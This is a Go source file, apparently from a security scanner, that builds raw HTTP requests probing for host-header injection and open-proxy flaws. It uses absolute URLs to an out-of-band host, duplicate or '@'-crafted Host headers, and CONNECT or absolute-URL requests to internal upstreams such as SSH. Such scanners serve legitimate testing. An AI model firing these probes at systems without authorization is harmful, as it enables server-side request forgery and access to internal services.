package scanner

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/blackfight1/everywhere/pkg/payload"
)

type ProxyUnsafeVariant struct {
	Method   string
	Upstream string
}

func BuildCrackingRequest(targetURL string, item payload.Payload, oobURL string) (RawRequest, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return RawRequest{}, err
	}

	host := parsed.Hostname()
	port := parsed.Port()
	useTLS := strings.EqualFold(parsed.Scheme, "https")
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	path := parsed.EscapedPath()
	if path == "" {
		path = "/"
	}
	if parsed.RawQuery != "" {
		path += "?" + parsed.RawQuery
	}

	address := netJoinHostPort(host, port)
	switch item.Key {
	case "absolute-url-host-mismatch":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET https://%s%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				oobURL, path, host,
			)),
		}, nil
	case "duplicate-host":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "host-with-at":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s@%s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, oobURL, host,
			)),
		}, nil
	case "host-at-reversed":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s@%s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	default:
		return RawRequest{}, fmt.Errorf("unsupported raw payload: %s", item.Key)
	}
}

func BuildProxyUnsafeRequest(targetURL string, variant ProxyUnsafeVariant) (RawRequest, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return RawRequest{}, err
	}

	host := parsed.Hostname()
	port := parsed.Port()
	useTLS := strings.EqualFold(parsed.Scheme, "https")
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}

	address := netJoinHostPort(host, port)
	method := strings.ToUpper(strings.TrimSpace(variant.Method))
	upstream := strings.TrimSpace(variant.Upstream)
	if method == "" || upstream == "" {
		return RawRequest{}, fmt.Errorf("invalid proxy-local-ssh variant")
	}

	requestLineTarget := "http://" + upstream
	if method == "CONNECT" {
		requestLineTarget = upstream
	}

	return RawRequest{
		Address: address,
		UseTLS:  useTLS,
		SNIHost: host,
		RawBytes: []byte(fmt.Sprintf(
			"%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
			method, requestLineTarget, host,
		)),
	}, nil
}

func netJoinHostPort(host string, port string) string {
	if strings.Contains(host, ":") {
		return "[" + host + "]:" + port
	}
	return host + ":" + port
}
